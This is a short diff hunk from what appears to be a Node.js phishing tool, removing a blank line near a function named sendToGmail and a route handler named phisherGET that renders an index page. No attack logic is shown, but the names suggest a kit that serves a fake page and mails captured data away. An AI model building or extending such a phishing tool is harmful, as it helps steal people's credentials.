@@ -29,7 +29,6 @@ const sendToGmail = (data) =>{
 
 }
 
-
 const phisherGET = (req,res) =>{
   return res.render("index.html",{})
 }
